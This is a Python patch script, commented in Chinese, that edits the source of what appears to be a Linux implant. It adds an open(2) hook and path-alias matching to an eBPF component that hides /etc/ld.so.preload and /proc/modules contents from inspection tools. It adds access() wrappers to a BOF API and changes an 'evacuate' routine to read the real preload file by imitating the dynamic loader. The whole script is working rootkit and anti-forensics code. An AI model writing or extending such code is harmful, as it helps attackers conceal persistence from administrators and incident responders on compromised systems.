#!/usr/bin/env python3
"""一次性落地 ISS-054（漏 hook open(2)）+ ISS-055（路径别名）的修复。

改动面（每处替换 assert count==1，先备份到 /tmp/axfix_bak/）：
  ① src_agent/bpf/redact.c          架构常量 + 尾部分量判据 + ax_note_open 抽取 + open(2) 分支
  ② src_agent/agent/syscalls_x64.h   __NR_access(21) + sys_access
  ③ src_agent/agent/syscalls_aarch64.h  __NR_faccessat(48) + sys_access（arm64 无 access(2)）
  ④ src_agent/agent/bof_api.h/.c     AxAccess 声明/实现/导出表
  ⑤ src_agent/bofs/evacuate.c        ax_read_real：撤退时读 preload 真身（豁免形态）
"""
import io
import os
import shutil
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BAK = "/tmp/axfix_bak"


def rd(p):
    with io.open(os.path.join(ROOT, p), encoding="utf-8") as f:
        return f.read()


def wr(p, s):
    with io.open(os.path.join(ROOT, p), "w", encoding="utf-8", newline="") as f:
        f.write(s)
    print("  [ok] %s → %d 行" % (p, s.count("\n") + 1))


def sub(V, old, new, tag):
    c = V.count(old)
    assert c == 1, "[%s] 锚点命中 %d 次（要求 1）" % (tag, c)
    return V.replace(old, new)


CHANGED = ["src_agent/bpf/redact.c",
           "src_agent/agent/syscalls_x64.h",
           "src_agent/agent/syscalls_aarch64.h",
           "src_agent/agent/bof_api.h",
           "src_agent/agent/bof_api.c",
           "src_agent/bofs/evacuate.c"]
os.makedirs(BAK, exist_ok=True)
for p in CHANGED:
    shutil.copy2(os.path.join(ROOT, p), os.path.join(BAK, os.path.basename(p)))

# ══ ① redact.c ════════════════════════════════════════════════════════════════
P = "src_agent/bpf/redact.c"
V = rd(P)

V = sub(V, """# define AX_NR_OPENAT  257
# define AX_NR_ACCESS  21      /* access(path,mode)：path 在 di */
# define AX_ACCESS_REG di
""", """# define AX_NR_OPENAT  257
# define AX_NR_OPEN    2       /* ★ x86_64 独有（ISS-054）：arm64 根本没有 open(2)，它的
                                *   sys_open 就是 openat —— 那条绕过面只在 x64 存在 */
# define AX_NR_ACCESS  21      /* access(path,mode)：path 在 di */
# define AX_ACCESS_REG di
# define AX_OPEN_PATH_REG  di  /* open(path,flags,mode) 与 openat(dirfd,path,...) 的参数
                                *   位置不同：open 的 path 在 di、flags 在 si */
# define AX_OPEN_FLAGS_REG si
""", "redact/arch")

PRED = r'''/* ── ★ 路径判据：比较**尾部分量**，而不是整串字面（ISS-055）──
 *
 * 字面比较（`ax_streq(p, "/etc/ld.so.preload", 19)`）有一个廉价到离谱的绕过：
 *
 *     /etc/ld.so.preload      ← 只有这一种写法和它对得上
 *     /etc//ld.so.preload     ← 多一个斜杠 → 字面不等 → 不记表 → 读到真内容
 *     /etc/./ld.so.preload    ← 同上
 *     ld.so.preload           ← cwd=/etc 时的相对写法，同上
 *
 * 这四种写法**解析后是同一个文件**。实测（tools/p16_alias_probe.py：同一次运行、
 * 同一个进程、同一个文件）：规范路径被抹成空格，其余四种**全部读到真 preload**。
 * 判据再准也没用 —— 对手只要多敲一个字符就绕过去了。
 *
 * 新判据 = 「路径的最后一个分量 == 目标名」：
 *   · 中间段**完全不看** → `//`、`/./`、`/../`、相对路径全部自动命中；
 *   · 代价是 `/tmp/ld.so.preload` 这类"别处的同名文件"也会被改写 —— 那恰恰是
 *     对手把文件拷出来再读的常见形态，认了比漏了强；这个文件名系统里唯一。
 *
 * 全程定长展开 + 位或累积，无分支（点 5）；长度用有界累加求、不用提前 return
 * —— n 个 return 就是 n 条 verifier 路径（点 7）。 */
#define AX_PL_WORD "ld.so.preload"
#define AX_PL_WLEN 14
#define AX_MD_WORD "modules"
#define AX_MD_WLEN 7

/* 有界求长。调用点的缓冲是 char[32] 且**已清零** → NUL 必在 [0,31]，`& 31` 因此
 * 无损；它唯一的用处是给 verifier 一个明确上界（否则下面 s[n-WL+i] 的变长索引
 * 它证不出来）。 */
static __always_inline __u32 ax_len32(const char *s)
{
    __u32 n = 0, done = 0;

    #pragma unroll
    for (int i = 0; i < 32; i++) {
        __u32 z = ax_iszero((__u32)(__u8)s[i]);
        n += (~done) & (z ^ 1u);
        done |= z;
    }
    return n & 31u;
}

#define AX_TAIL_FN(fn, W, WL)                                              \
static __always_inline __u32 fn(const char *s, __u32 n)                    \
{                                                                          \
    __u32 d = 0;                                                           \
    if (n < (WL))                                                          \
        return 0;                                                          \
    if (n == (WL))                                                         \
        return 1;                    /* 整串就是它（相对路径） */            \
    if (n < (WL) + 1)                                                      \
        return 0;                    /* 恒假；只为给 verifier 下界 n>=WL+1 */\
    _Pragma("unroll")                                                      \
    for (int i = 0; i < (WL); i++)                                         \
        d |= (__u32)(__u8)s[n - (WL) + i] ^ (__u32)(__u8)(W)[i];           \
    if (!ax_iszero(d))                                                     \
        return 0;                    /* 尾部不是那个词 */                   \
    return ax_iszero((__u32)(__u8)s[n - (WL) - 1] ^ (__u32)'/');           \
}                                    /* 前一个字符是 '/' → 是完整分量 */

AX_TAIL_FN(ax_tail_preload, AX_PL_WORD, AX_PL_WLEN)
AX_TAIL_FN(ax_tail_modules, AX_MD_WORD, AX_MD_WLEN)

/* openat 与 open 的公共后半段：路径 → 判据 → 记表。
 * 两个 syscall 的参数位置不同（openat: path=si flags=dx；open: path=di flags=si），
 * 所以寄存器在**调用点**取好再传进来 —— 让判据只有一份，不会再出现"改了一条
 * 忘了另一条"（ISS-054 就是这么来的）。 */
static __always_inline int ax_note_open(__u64 pathp, __u64 flags, long fd, __u64 id)
{
    char p[32];
    __u32 n;
    __u8 kind;
    __u64 key;

    if (fd < 0)
        return 0;
    /* 先清零：read_user_str 只写到 NUL 为止，其余字节是栈上残留（ISS-043 同族），
     * 后面的定长比较不先清就会拿残留去比。 */
    __builtin_memset(p, 0, sizeof(p));
    if (bpf_probe_read_user_str(p, sizeof(p), (void *)pathp) < 0)
        return 0;
    n = ax_len32(p);

    if (ax_tail_preload(p, n)) {
        __u64 pkey = ((__u64)(__u32)(id >> 32) << 32) | AX_PROBE_FD;
        __u8 *flagp = bpf_map_lookup_elem(&redact_fds, &pkey);

        /* ★ 判据 = 「本进程刚探测过它」**AND**「这条 open 带 O_CLOEXEC」。
         * 只看 O_CLOEXEC 分不开加载器和工具 —— coreutils / python 的 open 一样
         * 带它（实测 strace：os.open 与 ld.so 逐字节同形）；只看探测又挡不住
         * access()+open() 这种工具写法。两条同时成立才放行。 */
        if (flagp && *flagp == AX_KIND_PROBE && (flags & AX_O_CLOEXEC)) {
            bpf_map_delete_elem(&redact_fds, &pkey);   /* 一次性：消费掉 */
            return 0;                                  /* 不记表 = 不改写 */
        }
        kind = AX_KIND_PRELOAD;
    } else if (ax_tail_modules(p, n)) {
        kind = AX_KIND_MODULES;     /* /proc/modules 没有豁免问题 */
    } else {
        return 0;
    }

    key = ((__u64)(id >> 32) << 32) | (__u32)fd;
    bpf_map_update_elem(&redact_fds, &key, &kind, BPF_ANY);
    return 0;
}

'''
V = sub(V, "/* Address of the current task's pt_regs (top of its kernel stack). */",
        PRED + "/* Address of the current task's pt_regs (top of its kernel stack). */",
        "redact/pred")

# openat 分支整段替换（按大括号配对定位，不手抄原文）
L = V.split("\n")
i0 = next(i for i, l in enumerate(L) if l.strip() == "if (nr == AX_NR_OPENAT) {")
depth = 0
i1 = None
for i in range(i0, len(L)):
    depth += L[i].count("{") - L[i].count("}")
    if depth == 0:
        i1 = i
        break
assert i1, "openat 分支未配对"
old_block = "\n".join(L[i0:i1 + 1])
assert V.count(old_block) == 1, "openat 分支不唯一"
NEW_OPEN = '''    if (nr == AX_NR_OPENAT) {
        __u64 pathp = 0, flags = 0;

        if (bpf_probe_read_kernel(&pathp, sizeof(pathp), &regs->si) != 0)
            return 0;
        if (bpf_probe_read_kernel(&flags, sizeof(flags), &regs->dx) != 0)
            return 0;
        return ax_note_open(pathp, flags, args->ret, id);
    }

#ifdef AX_NR_OPEN
    /* ★ ISS-054：`open(2)` 与 `openat(2)` 是**两条不同的 syscall**。只挂 openat 时，
     * 任何直调 `open(2)` 的程序（静态链接 / musl / 直调 syscall / **我们自己的
     * AxReadFileToBuffer**）读 preload **完全不被改写** —— 判据再准也没用，因为
     * 那条路径根本没进这个函数（p16 实测：同一次运行里规范路径被抹平、open(2)
     * 读到全文）。参数位置也不同：path 在 di、flags 在 si。 */
    if (nr == AX_NR_OPEN) {
        __u64 pathp = 0, flags = 0;

        if (bpf_probe_read_kernel(&pathp, sizeof(pathp), &regs->AX_OPEN_PATH_REG) != 0)
            return 0;
        if (bpf_probe_read_kernel(&flags, sizeof(flags), &regs->AX_OPEN_FLAGS_REG) != 0)
            return 0;
        return ax_note_open(pathp, flags, args->ret, id);
    }
#endif'''
V = V.replace(old_block, NEW_OPEN)
wr(P, V)

# ══ ②③ syscalls 头 ═══════════════════════════════════════════════════════════
P = "src_agent/agent/syscalls_x64.h"
V = rd(P)
V = sub(V, "#define __NR_ioctl          16\n#define __NR_pipe           22\n",
        "#define __NR_ioctl          16\n#define __NR_access         21\n#define __NR_pipe           22\n",
        "x64/__NR_access")
V = sub(V, """static inline int sys_open(const char *path, int flags, int mode) {
    return (int)raw_syscall3(__NR_open, (long)path, flags, mode);
}
""", """static inline int sys_open(const char *path, int flags, int mode) {
    return (int)raw_syscall3(__NR_open, (long)path, flags, mode);
}

/// access(path, mode) — R_OK=4 / F_OK=0。存在的意义只有一条：redact.c 的
/// preload 豁免判据是「刚 access 探测过」**AND**「带 O_CLOEXEC」，而我们自己
/// 的代码要读 preload 真身时就必须摆出**这个**形态（见 bofs/evacuate.c）。
/// ⚠️ 不能拿 faccessat(269) 代替：redact 只认 access(21) 这一条。
static inline int sys_access(const char *path, int mode) {
    return (int)raw_syscall2(__NR_access, (long)path, mode);
}
""", "x64/sys_access")
wr(P, V)

P = "src_agent/agent/syscalls_aarch64.h"
V = rd(P)
V = sub(V, "#define __NR_openat          56\n",
        "#define __NR_openat          56\n#define __NR_faccessat       48\n",
        "arm64/__NR_faccessat")
V = sub(V, """static inline int sys_open(const char *path, int flags, int mode) {
    return sys_openat(AT_FDCWD, path, flags, mode);
}
""", """static inline int sys_open(const char *path, int flags, int mode) {
    return sys_openat(AT_FDCWD, path, flags, mode);
}

/// access(path, mode) — arm64 **没有** access(2)，走 faccessat(dirfd,path,mode)。
/// redact.c 的 arm64 分支认的正是 48（AX_NR_ACCESS），两边一致。
static inline int sys_access(const char *path, int mode) {
    return (int)raw_syscall3(__NR_faccessat, AT_FDCWD, (long)path, mode);
}
""", "arm64/sys_access")
wr(P, V)

# ══ ④ bof_api ═════════════════════════════════════════════════════════════════
P = "src_agent/agent/bof_api.h"
V = rd(P)
V = sub(V, """// getrandom(buf, len) — CSPRNG bytes; returns bytes filled or -1.
int    AxGetRandom(void *buf, int len);
""", """// getrandom(buf, len) — CSPRNG bytes; returns bytes filled or -1.
int    AxGetRandom(void *buf, int len);
// access(path, mode) — R_OK=4 / F_OK=0, 0 on success.
//
// Exists for exactly one reason: redact.c (P3-A) only lets a read of
// /etc/ld.so.preload through when the *same* process has just probed it with
// access(2) AND opens it with O_CLOEXEC — that pair is what tells ld.so apart
// from a tool.  Any of our own code that must see the REAL preload body has to
// look like the loader, not like a tool (see bofs/evacuate.c ax_read_real).
int    AxAccess(const char *path, int mode);
""", "api.h/AxAccess")
wr(P, V)

P = "src_agent/agent/bof_api.c"
V = rd(P)
V = sub(V, """int AxUnlink(const char *path) {
    if (!path) return -1;
    return sys_unlink(path);
}
""", """int AxUnlink(const char *path) {
    if (!path) return -1;
    return sys_unlink(path);
}

int AxAccess(const char *path, int mode) {
    if (!path) return -1;
    return sys_access(path, mode);
}
""", "api.c/AxAccess")
V = sub(V, """    {"AxOpenFile",           (void *)AxOpenFile},""",
        """    {"AxAccess",             (void *)AxAccess},
    {"AxOpenFile",           (void *)AxOpenFile},""", "api.c/table")
wr(P, V)

# ══ ⑤ evacuate.c ══════════════════════════════════════════════════════════════
P = "src_agent/bofs/evacuate.c"
V = rd(P)
READ_REAL = r'''#define EV_O_CLOEXEC 0x80000

/// ★ 读 preload 的**真身**（ISS-054 的连带修复：redact 补上 open(2) 分支之后，
/// 这一步立刻会中招）。
///
/// 不能用 AxReadFileToBuffer：它走 `open(2)` + O_RDONLY（既不先探测、也不带
/// O_CLOEXEC），在 redact（P3-A）眼里和普通工具**逐字节同形** → 读回来的是被
/// 抹平的假 preload（我们自己那一行看不见）→ 本步会"成功地什么都没删"，回执
/// 还照报 removed。
///
/// redact 的豁免判据 =「本进程刚用 access(2) 探测过它」**AND**「这条 open 带
/// O_CLOEXEC」—— 那正是 ld.so 开 preload 的形态。撤离命令是**我们自己的**工具，
/// 走这条通道是**有意**的：它要删的就是那个我们藏起来的行。
///
/// 顺序不能反：探测必须在 open **之前**（redact 在 access 返回时打旗标，在 open
/// 返回时把它一次性消费掉）。
static int ax_read_real(const char *path, char **out, int max) {
    char *buf;
    int fd, total = 0;

    *out = (char *)0;
    AxAccess(path, 4 /* R_OK */);                              /* ① 探测：打旗标 */
    fd = AxOpenFile(path, 0 /* O_RDONLY */ | EV_O_CLOEXEC, 0); /* ② 带 CLOEXEC */
    if (fd < 0) return -1;
    buf = (char *)AxMalloc(max + 1);
    if (!buf) { AxCloseFile(fd); return -1; }
    while (total < max) {
        int n = AxReadFile(fd, buf + total, max - total);
        if (n <= 0) break;
        total += n;
    }
    AxCloseFile(fd);
    buf[total] = 0;
    *out = buf;
    return total;
}

'''
V = sub(V, "/// 从 /etc/ld.so.preload 移除以 prefix 开头的整行。空文件 → unlink。",
        READ_REAL + "/// 从 /etc/ld.so.preload 移除以 prefix 开头的整行。空文件 → unlink。",
        "evac/fn")
V = sub(V, "    int old_len = AxReadFileToBuffer(path, &old, 65536);",
        "    int old_len = ax_read_real(path, &old, 65536);   /* 真身；见 ax_read_real 头注 */",
        "evac/call")
wr(P, V)

print("\n[OK] 5 个文件已改；原文件备份在 %s" % BAK)
